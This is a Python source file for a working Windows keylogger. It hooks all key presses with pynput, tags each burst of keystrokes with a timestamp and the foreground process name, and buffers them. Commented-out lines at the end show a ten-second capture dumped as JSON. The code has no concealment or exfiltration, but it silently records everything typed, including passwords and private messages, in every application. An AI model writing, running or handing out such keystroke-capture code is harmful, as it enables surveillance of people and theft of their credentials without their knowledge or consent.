import threading
from pynput import keyboard 
import time
import json
from copy import deepcopy
import psutil
import win32gui
import win32process

class KeyLog():
    def __init__(self):

        self.buffer = []
        self.last = None

    def _log(self, key):
        try:
            char = key.char
        except AttributeError:
            char = str(key)

        current_process = self._current()
                
        if current_process is None:
            return None
        
        name, _title = current_process

        if current_process[0] != self.last:
            self.last = current_process[0]

            self.buffer.append({
            "tstamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time())),
            "process": name,
            "keys": [],
            })

        self.buffer[-1]["keys"].append(char)
    
    def _current(self):
        hwnd = win32gui.GetForegroundWindow()

        if not hwnd:
            return None

        _, pid = win32process.GetWindowThreadProcessId(hwnd)

        try:
            name = psutil.Process(pid).name()
        except psutil.Error:
            name = f"<pid {pid}"

        return name, win32gui.GetWindowText(hwnd) 

    def start(self):
        self.listener = keyboard.Listener(on_press=self._log)
        self.listener.start()

    def stop(self):
        self.listener.stop()
    
    def drain(self):
        temp, self.buffer = self.buffer, []
        return temp

# log1 = KeyLog()
# log1.start()
# time.sleep(10)
# log1.stop()

# data = log1.drain()
# print(json.dumps(data, indent = 2))